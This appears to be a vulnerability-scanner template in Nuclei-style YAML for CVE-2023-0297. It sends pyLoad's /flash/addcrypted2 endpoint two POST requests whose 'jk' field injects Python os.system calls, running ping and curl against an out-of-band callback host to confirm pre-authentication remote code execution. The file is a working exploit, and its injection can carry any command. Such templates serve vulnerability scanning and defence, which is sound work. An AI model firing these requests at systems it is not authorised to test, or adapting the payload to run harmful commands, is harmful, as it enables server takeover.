id: yaml-poc-pyload-pyload-rce-CVE-2023-0297
info:
  name: Yaml Poc Pyload Pyload Rce Cve 2023 0297
  author: h1ei1
  severity: critical
  description: 'Converted from xpoc: yaml-poc-pyload-pyload-rce-CVE-2023-0297'
  tags: rce,cve
  classification:
    cve-id: CVE-2023-0297
  reference:
  - http://packetstormsecurity.com/files/171096/pyLoad-js2py-Python-Execution.html
  - http://packetstormsecurity.com/files/172914/PyLoad-0.5.0-Remote-Code-Execution.html
  - https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d
  - https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65
http:
- method: POST
  path:
  - /flash/addcrypted2
  body: jk=pyimport%20os;os.system("ping%20-c%201%20{{reverseDomain}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
  - type: word
    part: body
    words:
    - Could not decrypt key
- method: POST
  path:
  - /flash/addcrypted2
  body: jk=pyimport%20os;os.system("curl%20{{reverseURL}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
  - type: word
    part: body
    words:
    - Could not decrypt key
